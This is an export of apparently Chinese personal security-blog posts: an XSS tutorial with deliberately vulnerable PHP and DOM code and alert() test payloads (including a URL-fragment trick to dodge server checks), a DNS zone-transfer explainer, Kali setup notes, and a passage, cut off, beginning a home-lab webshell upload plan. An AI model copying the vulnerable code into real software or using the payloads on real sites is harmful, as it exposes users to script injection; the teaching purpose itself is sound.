<p>​        XSS是指攻击者在网页嵌入客户端脚本，通常使用的是JavaScript编写的恶意代码，当用户浏览网页时，恶意代码将在用户的浏览器上执行。</p>
<p>​        XSS属于前端漏洞，受害者是用户，但是网站的管理人员也是用户之一，也有可能被攻击者拿到管理员权限，作为跳板实施攻击。</p>
<p>​        本篇文章用于对XSS原理解析和对各种类型的XSS介绍。</p>
<a id="more"></a>

<h1 id="XSS原理解析"><a href="#XSS原理解析" class="headerlink" title="XSS原理解析"></a>XSS原理解析</h1><p>​        XSS是在网页输入口插入用脚本语言(一般是JavaScript)，如果服务端不对用户输入进行严格过滤且返回给客户端输出，那么就有可能造成跨站脚本漏洞。</p>
<p>​        JavaScript编写的脚本可以用来获取用户cookie，改变网页内容，URL跳转，那么存在XSS漏洞的网站，就可以盗取用户的cookie，黑掉页面，导航到恶意网站，而攻击者只需要在网页中注入JavaScript代码即可。</p>
<p>​        用本地搭建的网站环境测试：</p>
<p><img src="https://s2.ax1x.com/2020/03/04/3IeAZd.png" alt="3IeAZd.png"></p>
<p>get方式提交测试代码：</p>
<p><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>
<p><img src="https://s2.ax1x.com/2020/03/04/3IZT2T.png" alt="3IZT2T.png"></p>
<p>利用post方式提交：</p>
<p><img src="https://s2.ax1x.com/2020/03/04/3IemJP.png" alt="3IemJP.png"></p>
<p>网页源代码为：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>XSS测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>输入文本<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"xss.php"</span> <span class="attr">method</span>=<span class="string">"GET"</span> <span class="attr">enctype</span>=<span class="string">"application/x-www-form-urlencoded"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span>get方式提交<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"gettxt"</span> <span class="attr">id</span>=<span class="string">"gettxt"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"xss.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"application/x-www-form-urlencoded"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span>POST方式提交<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"posttxt"</span> <span class="attr">id</span>=<span class="string">"posttxt"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>php代码为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;XSS测试&lt;&#x2F;title&gt;</span><br><span class="line">        &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h3&gt;输出结果：&lt;&#x2F;h3&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&quot;gettxt&quot;])) &#123;</span><br><span class="line">    echo $_GET[&quot;gettxt&quot;];</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_POST[&quot;posttxt&quot;])) &#123;</span><br><span class="line">    echo $_POST[&quot;posttxt&quot;];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到上述服务器对用户输入没有进行任何防护，直接在客户端上输出，就有了XSS漏洞。</p>
<p>JavaScript在HTML中不仅由上述方式加载脚本，还有：</p>
<blockquote>
<ol>
<li><code>&lt;script&gt;脚本语句&lt;/script&gt;</code></li>
<li><code>&lt;script type=&quot;text/javascript&quot; src=&quot;js文件地址&quot;&gt;&lt;/script&gt;</code></li>
<li><code>&lt;input type=&quot;button&quot; value=&quot;点击&quot; onclick=&quot;var a=&#39;test&#39;;alert(a)&quot;&gt;</code></li>
</ol>
</blockquote>
<p>注意：</p>
<ul>
<li><p>在2中JavaScript加载外部的代码文件可以是任意扩展名(无扩展名也可以)，如：</p>
<p><code>&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.example.com/x.jpg&quot;&gt;&lt;/script&gt;</code></p>
<p>即使文件扩展名为jpg，但是只要文件中包含js代码就会被执行。</p>
</li>
<li><p>在3中以HTML事件处理器中写入js代码，这里不光有onclick还有更多类似onmouseover，onmouseout等多种事件，对事件的如何触发也有不同，如：</p>
<p><code>&lt;button onclick=&quot;this.innerHTML=Date()&quot;&gt;现在的时间是?&lt;/button&gt;</code></p>
</li>
</ul>
<h1 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h1><p>​        XSS总共分为三类：</p>
<blockquote>
<ol>
<li>反射型XSS</li>
<li>存储型XSS</li>
<li>DOM型XSS</li>
</ol>
</blockquote>
<h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>​        反射型XSS，也被称为非持久型XSS，是最容易出现的一种XSS。用户点击一个攻击者生成的具有js代码的URL，服务器没有对URL严格过滤返回给用户，用户的浏览器执行js代码，最终造成XSS漏洞。</p>
<p>服务器代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $username = $_GET[<span class="string">'username'</span>];</span><br><span class="line">	<span class="keyword">echo</span> $username;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>则攻击者可以生成具有js代码的URL：</p>
<p><code>http://www.example.com/xss.php?username=&lt;script&gt;XSS恶意代码&lt;/script&gt;</code></p>
<p>用户的点击后，就会执行XSS恶意代码。</p>
<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>​        存储型XSS又称为持久性XSS，是最危险的一种跨站脚本，具有更高的隐蔽性，危害性更大。</p>
<p>​        允许用户存储数据的web应用程序都有可能会出现存储型XSS漏洞，当攻击者提交一段XSS代码后，服务器将其保存在数据库中，在正常用户访问某个页面时，这段代码将会被程序读出来响应给浏览器，造成XSS攻击。</p>
<p>​        这里用DVWA的存储型XSS(LOW)示例：</p>
<p><img src="https://s2.ax1x.com/2020/03/06/3HzhpF.png" alt="3HzhpF.png"></p>
<p>模拟了一个网站的评论区，这里注入XSS代码：</p>
<p><img src="https://s2.ax1x.com/2020/03/04/3ItVGF.png" alt="3ItVGF.png"></p>
<p>最终注入成功，因为XSS代码保存到数据库中，所以用户每次登陆这个界面都会触发代码：</p>
<p><img src="https://s2.ax1x.com/2020/03/04/3ItZ24.png" alt="3ItZ24.png"></p>
<h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>​        DOM型XSS是基于DOM文档对象模型的一种漏洞。严格地说，DOM型XSS其实算反射型XSS，区别在于DOM型XSS并不会和后台进行交互，是完完全全的Web前端安全问题，要做防御也只能在客户端上进行防御。</p>
<p>​        首先，客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它并不与服务端进行交互而是从客户端获得DOM中的数据（如从URL中获取数据）并在本地执行；其次，浏览器用户可以操纵DOM中的一些对象如URL、location等；因此，当攻击者可以控制一些DOM对象、输入一些恶意JS代码，而客户端的脚本并没有对用户输入内容进行有效的过滤就传入一些执行危险操纵的函数如eval等或直接输出到页面时，就会导致DOM型XSS漏洞的存在。</p>
<p><strong>DOM</strong></p>
<p>​        DOM(Document Object Model)，文档对象模型，是HTML和XML文档的编程接口。</p>
<p>​        其中HTML DOM定义了所有HTML元素的对象和属性，以及访问它们的方法。换言之，HTML DOM是关于如何获取、修改、添加或删除HTML元素的标准。关于DOM树的操作方法之后会介绍。</p>
<p>​        DOM以树结构表达HTML文档。</p>
<p><img src="https://s2.ax1x.com/2020/03/04/3Iblwj.png" alt="3Iblwj.png"></p>
<p>下面是一个包含DOM型XSS漏洞的HTML页面：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM XSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> pos=<span class="built_in">document</span>.URL.indexOf(<span class="string">"name="</span>)+<span class="number">5</span>;</span></span><br><span class="line"><span class="javascript">	<span class="built_in">document</span>.write(<span class="built_in">decodeURI</span>(<span class="built_in">document</span>.URL.substring(pos,<span class="built_in">document</span>.URL.length)));</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​        上述HTML文档中的JavaScript代码会将URL中参数 ‘name=’ 内容截取下来，写入到DOM结构中，也就是HTML文档中，其功能的实现全都在前端JS中进行、未与后台进行任何交互。</p>
<p><img src="https://s2.ax1x.com/2020/03/05/3TP06H.png" alt="3TP06H.png"></p>
<p>​        测试payload：</p>
<p>​        <code>http://www.example.com/domxss.html?name=&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p>​        虽然会用get方式提交name数据，但是实际实现是在前端的script代码中，也可以为了绕过后端服务器的检测，使用如下payload：</p>
<p>​        <code>http://www.example.com/domxss.html#name=&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p>​        其中#号表示在URL中#后面的内容不会传到后端处理，只在前端使用，这样就可以隐蔽恶意代码不被后端检测出来。</p>
<p><img src="https://s2.ax1x.com/2020/03/05/3TPBXd.png" alt="3TPBXd.png"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>DNS服务以及DNS域传送漏洞</title>
    <url>/2020/03/01/DNS%E6%9C%8D%E5%8A%A1%E4%BB%A5%E5%8F%8ADNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        疫情影响，宅在家里，开学推迟，要上网课，有课名叫，网络攻防，要上实验，网上靶机，可是靶机，实在不行，自己搭建，两眼蒙蔽，从头做起，选择放弃。(哭)</p>
<p>​        这次要做的实验内容和DNS域传送漏洞有关，其实也是用工具进行信息收集，之前忽略了信息收集这块，觉得不太重要，但是现在回头来看，这是最重要的一部分，自己也回头补补。DNS域名查询也很重要，要不渗透前都不知道目标是谁。</p>
<a id="more"></a>

<h1 id="DNS服务：因特网的目录服务"><a href="#DNS服务：因特网的目录服务" class="headerlink" title="DNS服务：因特网的目录服务"></a>DNS服务：因特网的目录服务</h1><p>​        之前看过《计算机网络：自顶向下方法》这本书对DNS的讲解，确实不错，但是当时读的有些晦涩难懂，现在回头去看有些地方确实重新理解到了。现在重新理解回忆一波DNS。</p>
<h2 id="DNS定义"><a href="#DNS定义" class="headerlink" title="DNS定义"></a>DNS定义</h2><p>​        在因特网的主机中，有一种标识方式就是用它的主机名(hostname)，例如：<code>www.baidu.com</code>，<code>www.4399.com</code>等，但是主机名并没有透漏多少在因特网中的位置信息，实际上在因特网上的主机通信是用IP地址来进行的。人们喜欢用主机名的标识方式使用，而路由器喜欢定长，有层次结构的IP地址。为了折中，就产生了DNS(Domain Name System)域名系统，用于进行主机名到IP地址转换的目录结构。</p>
<p>​        DNS是：</p>
<ol>
<li>一个由分层的DNS服务器实现的分布式数据库。</li>
<li>一个使得主机能查询分布式数据库的应用层协议。</li>
</ol>
<p>​        DNS服务器通常是运行BIND软件的UNIX机器，DNS在进行区域传输的时候使用TCP协议，其它时候则使用UDP协议，使用TCP53端口和UDP53端口。(DNS只有两种报文，查询/回答报文)</p>
<h2 id="DNS工作过程"><a href="#DNS工作过程" class="headerlink" title="DNS工作过程"></a>DNS工作过程</h2><p>例如用户在浏览器中请求URL：<code>www.example.com/index.html</code>则会发生以下过程：</p>
<ol>
<li>浏览器从上述URL中抽取主机名<code>www.example.com</code>并交给同一机器上运行的DNS客户端</li>
<li>DNS客户端向DNS服务器发送一个包含主机名的请求</li>
<li>DNS客户端最终会收到一份回答报文，其中含有对应与该主机名的IP地址</li>
<li>浏览器收到来自DNS客户端的该IP地，它能向位于该IP地址的80端口的HTTP服务器进程HTTP请求</li>
</ol>
<h2 id="DNS的其他服务"><a href="#DNS的其他服务" class="headerlink" title="DNS的其他服务"></a>DNS的其他服务</h2><ul>
<li>主机别名：有复杂主机名的主机可以拥有一个或多个别名，例如一台规范主机名为relay1.west-coast.enterprise.com可能有两个别名<code>enterprise.com</code>或者<code>www.enterprise.com</code>。应用程序可以调用主机别名来获得规范主机名和IP地址</li>
<li>邮件服务器别名：例如<code>example@gmail.com</code>，中邮件服务器别名为<code>gmail.com</code>比它的规范主机名好记的多</li>
<li>负载分配：用于冗余的服务器或者具有CDN的服务器上。要访问的站点被分布在多台服务器上，具有不同的IP地址，因此一个IP地址集合与同一个规范主机名所联系。当客户对其发送一个DNS请求时候，DNS服务器用IP地址的整个集合进行响应，但在每个回答中循环这些地址次序。</li>
</ul>
<h2 id="DNS组织方式"><a href="#DNS组织方式" class="headerlink" title="DNS组织方式"></a>DNS组织方式</h2><h3 id="DNS结构"><a href="#DNS结构" class="headerlink" title="DNS结构"></a>DNS结构</h3><p>​        从DNS的工作方式来看，DNS不可能是单一集中的数据库，而是使用大量的DNS服务器，以层次方式组织。大致来说DNS有三种基本类型：根DNS服务器，顶级域(TLD),DNS服务器，权威服务器。</p>
<p><img src="https://s2.ax1x.com/2020/03/01/3cJecF.png" alt="3cJecF.png"></p>
<p>​        如果你的请求没有命中本地DNS服务器缓存，那么这个缓存服务器就会自己进行一次标准查询，然后再把结果缓存起来，简单来说就是从根服务器开始一级一级的问。我们以前经常谈到根服务器的重要性其实就体现在这里了，它保留了对所有域名的起始解释权。</p>
<p>​        根服务器拥有一切域名的起始解释权，但是如果你去问根服务器它是不会直接告诉你最终答案的。因为如果它要存储所有的记录，那它也太累了，这个负载和开销是惊人的。那它会告诉你什么呢？它会告诉你应该去问谁，也就是它授权下一级服务器来解答你的问题。拟人化这个过程:</p>
<ol>
<li>我（本地DNS服务器）: root, root 告诉我， example.com 怎么走？</li>
<li>root: 呵呵，你可以去问.com的dns服务器，地址是xxxxxx</li>
<li>我: .com, .com 告诉我，example.com 怎么走？</li>
<li>.com: 呵呵，你可以去问example.com的dns服务器(dnspod之类的)，地址是xxxxxx</li>
<li>我: dnspod, dnspod 告诉我，example.com 怎么走？</li>
<li>dnspod: 拿着 xxxxxx，走你</li>
</ol>
<p>​        这个例子假设TLD服务器直到用于主机的权威DNS服务器的IP地址，一般来说，这种假设不总是正确，相反，TLD服务器只知道某个中间的DNS服务器，该中间的DNS服务器依次才知道用于该主机的权威DNS服务器。上述例子利用了递归查询和迭代查询，从自己主机到本地DNS服务器查询是递归的，本地DNS服务器查询是迭代的。</p>
<h3 id="DNS缓存"><a href="#DNS缓存" class="headerlink" title="DNS缓存"></a>DNS缓存</h3><p>​        实际中，为了改善时延和减少因特网中DNS报文数量，DNS广泛采用了缓存技术。在一个请求链中，某个DNS服务器在收到DNS回答报文时，它能将映射缓存到服务器中，缓存并不是永久的，DNS服务器在一段时间后将丢弃缓存的信息。本地DNS服务器也能够缓存TLD服务器的IP地址，因此允许本地服务器DNS查询绕过查询链中的根DNS服务器。</p>
<h2 id="DNS记录"><a href="#DNS记录" class="headerlink" title="DNS记录"></a>DNS记录</h2><p>​        一条DNS记录就是一个映射关系，它的大致结构是（Name,Value,Type,TTL）其中TTL是该记录的生存时间。</p>
<p>其中Type类型有多种：</p>
<blockquote>
<p>（1） <code>A</code>：地址记录（Address），返回域名指向的IP地址。</p>
<p>（2） <code>NS</code>：域名服务器记录（Name Server），返回保存下一级域名信息的服务器地址。该记录只能设置为域名，不能设置为IP地址。</p>
<p>（3）<code>MX</code>：邮件记录（Mail eXchange），返回接收电子邮件的服务器地址。</p>
<p>（4）<code>CNAME</code>：规范名称记录（Canonical Name），返回另一个域名，即当前查询的域名是另一个域名的主机别名。</p>
<p>（5）<code>PTR</code>：逆向查询记录（Pointer Record），只用于从IP地址查询域名，详见下文。</p>
</blockquote>
<h2 id="在DNS数据库中插入记录"><a href="#在DNS数据库中插入记录" class="headerlink" title="在DNS数据库中插入记录"></a>在DNS数据库中插入记录</h2><p>​    如果你刚刚创建了一个新公司，那么你必定要做的第一件事就是在注册登记机构注册域名newcompany.com，则需要向该机构提供你的基本和辅助权威DNS服务器的名字和IP地址，例如为：dns1.newcompany.com和dns2.newcompany.com以及212.212.212.1和212.212.212.2。对这两个权威DNS服务器的每一个，该机构都要确保将一个类型为NS和一个类型为A的记录输入TLD com服务器，特别是对于用于newcompany.com的基本权威服务器。</p>
<blockquote>
<p>(newcompany.com, dns1.newcompany.com, NS)</p>
<p>(dns1.newcompany.com, 212.212.212.1, A)</p>
</blockquote>
<p>​    那么此时有个新用户想要访问你的公司主页<code>www.newcompany.com</code>，那么用户的DNS客户端先向本地的DNS服务器发送请求，本地的DNS服务器向TLD com服务器发送请求(如果本地DNS服务器没有缓存TLD com服务器的地址，那么它会先向根DNS服务器发送请求TLD com服务器的地址)，TLD com服务器向本地DNS服务器回答上述的两条DNS记录，本地DNS服务器则会根据上述两条记录向公司的权威DNS服务器发送DNS请求报文，而权威DNS服务器会回答一个具有类型为A的DNS记录的DNS报文，里面含有你要请求的站点的IP地址，例如：212.212.71.4，本地的DNS服务器会把这条DNS记录发给用户的DNS客户端并且在服务器中缓存一段时间，用户则会对这个IP地址发起一个TCP连接，并在该连接上发送一个HTTP请求。</p>
<p>参考文章：    </p>
<ol>
<li><a href="https://segmentfault.com/a/1190000002578457" target="_blank" rel="noopener">https://segmentfault.com/a/1190000002578457</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2016/06/dns.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2016/06/dns.html</a></li>
</ol>
<h1 id="DNS域传送漏洞"><a href="#DNS域传送漏洞" class="headerlink" title="DNS域传送漏洞"></a>DNS域传送漏洞</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>​        DNS作为重要的互联网基础设施，难免成为黑客的重点攻击目标，服务的稳定性尤为重要。DNS服务器分为：主服务器、备份服务器和缓存服务器。在主备服务器之间同步数据库，需要使用“DNS域传送”。域传送是指后备服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。</p>
<p>​        若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。凭借这份网络蓝图，攻击者可以节省很少的扫描时间。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>域传送关键配置项为：配置位置在/etc/named.conf文件中</p>
<p>allow-transfer {ipaddress;}; 通过ip限制可进行域传送的服务器</p>
<p>allow-transfer { key transfer; }; 通过key限制可进行域传送的服务器</p>
<p>测试版本为BIND 9.8.2rc1-RedHat-9.8.2-0.10.rc1.el6_3.6，默认安装完毕后，配置项没有allow-transfer 项。如果直接使用默认配置文件进行配置的话（不手动添加allow-transfer项），就会存在dns 域传送漏洞。</p>
<p><img src="https://s2.ax1x.com/2020/03/01/3gA8nU.png" alt="3gA8nU.png"></p>
<p>可以看到此时DNS服务器域传输失败，说明不存在漏洞。</p>
<p><img src="https://s2.ax1x.com/2020/03/01/3gAcAH.png" alt="3gAcAH.png"></p>
<p>注释掉这一行，开启任意DNS域传送。</p>
<p><img src="https://s2.ax1x.com/2020/03/01/3gA4jf.png" alt="3gA4jf.png"></p>
<p>此时可以看到服务器所有的子域名。</p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>解决域传送问题非常简单，只需要在相应的zone、options中添加allow-transfer限制可以进行同步的服务器就可以了，可以有两种方式：限制IP、使用key认证。</p>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>DNS</tag>
        <tag>DNS域传送漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>kali-19.4汉化以及伪装win10界面</title>
    <url>/2020/02/28/kali-19-4%E6%B1%89%E5%8C%96%E4%BB%A5%E5%8F%8A%E4%BC%AA%E8%A3%85win10%E7%95%8C%E9%9D%A2/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        之前用虚拟机做实验的时候汉化过一次，后来文件被删了(都是自己手贱)，现在又要因为实验要求重新下载一次，但是忘记kali的汉化过程，这次特意记录一下。我用的是kali-2019.4版本，这个版本新上线了一个可以伪装成Windows10的功能，也挺有意思的。</p>
<a id="more"></a>

<h1 id="汉化过程"><a href="#汉化过程" class="headerlink" title="汉化过程"></a>汉化过程</h1><p>​        首先把kali的下载源更改为国内：kali源：</p>
<p>​        <code>vim /etc/apt/source.list</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#中科大</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#阿里云</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#清华大学</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line">#浙大</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.zju.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.zju.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line">#官方源</span><br><span class="line">deb http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>

<ol>
<li><p>更新源和软件</p>
<p><code>apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get clean</code></p>
</li>
<li><p>选语言</p>
<p><code>dpkg-reconfigure locales</code></p>
<p>进入图形界面，选中en_US.UTF-8 UTF-8和zh_CN.UTF-8 UTF-8（空格是选择，tab是切换，*是选中）并将zh_US.UTF-8选为默认。</p>
</li>
<li><p>安装中文字体</p>
<p><code>apt-get install xfonts-intl-chinese</code></p>
<p><code>apt-get install ttf-wqy-microhei</code></p>
</li>
<li><p>重启kali</p>
<p>重启若还是英文，就继续重启，基本一到两次后就可以了</p>
</li>
</ol>
<h1 id="win10-模式"><a href="#win10-模式" class="headerlink" title="win10 模式"></a>win10 模式</h1><p>终端执行 <code>kali-undercover</code></p>
<p><img src="https://s2.ax1x.com/2020/02/28/3rtbOs.png" alt="3rtbOs.png"></p>
<p>再次输入 <code>kali-undercover</code>即可退出win10模式</p>
<p><img src="https://s2.ax1x.com/2020/02/28/3rNZtK.png" alt="3rNZtK.png"></p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试实战--家用电脑</title>
    <url>/2020/02/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98-%E5%AE%B6%E7%94%A8%E7%94%B5%E8%84%91/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        因为疫情的影响导致现在还没有开学，在家里呆的有些无聊，最近也在学习渗透方面的知识，但是关于渗透测试，纸上得来终觉浅，绝知此事要躬行，还是要得累计实战经验，所以我就把目标转向了我家的家用台式电脑，就想把之前学习理解到的简单实现一下。</p>
<a id="more"></a>

<h1 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h1><p>​        家用电脑比较老旧，是在我上初中的时候买的，甚至系统还是<strong>Windows xp</strong>，属于可以进博物馆的古董机，没办法，有靶机已经不错了，无论是虚拟机还是网上的靶场都感觉不得劲，还是物理机有搞头。</p>
<p>​        我开始的时候是想用IIS建站的，但是中间有很多坑，这不算什么，<strong>一杯茶一包烟，一改配置坐一天</strong>，就当我觉得环境搭建成功的时候，我又发现了新的坑，一个是没有php环境，而且IIS支持asp，这也不算什么，但是又发现，开始的时候可以访问的资源莫名其妙的都无权访问了，网页报401，草(一种植物)，在尝试了网上很多方法了之后，我哭了，我放弃了，xp下的IIS服务的权限设置我搞不懂，还是我太弱了，我真是个垃圾(猛男哭泣)。</p>
<p>​        我屈服了，我使用了phpstudy的傻瓜式操作建站，只能说真香，它是如此的便捷，如此的丝滑，我又一次哭了。</p>
<p><img src="https://s2.ax1x.com/2020/02/23/31dxbR.png" alt="31dxbR.png"></p>
<p>还是觉得老版本的phpstudy好用，关于phpstudy的安装和使用就不多说了，直接进入正题。</p>
<p>首先，测试一下，查看一下靶机IP</p>
<p><img src="https://s2.ax1x.com/2020/02/23/31SMLT.png" alt="31SMLT.png"></p>
<p>发现是192.168.0.122</p>
<p>在本机上测试ping一下</p>
<p><img src="https://s2.ax1x.com/2020/02/23/31p9h9.png" alt="31p9h9.png"></p>
<p>可以连上，在浏览器中查看</p>
<p><img src="https://s2.ax1x.com/2020/02/23/31wssJ.png" alt="31wssJ.png"></p>
<p>没问题，环境搭建好了，现在开始测试</p>
<h1 id="建站"><a href="#建站" class="headerlink" title="建站"></a>建站</h1><p>先给靶机配上编辑器，要不用记事本写太变态了。这里我用的notepad++。</p>
<p>这里我准备用上文件上传漏洞来上传一个webshell，用到菜刀连接获取靶机的权限。</p>
<p>所以在靶机中写上一个具有文件上传功能的网页：</p>
<p><img src="https://s2.ax1x.com/2020/02/23/31HMF0.png" alt="31HMF0.png"></p>
<p>这里的HTML代码为：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>请上传一个文件<span class="tag">&lt;/<span 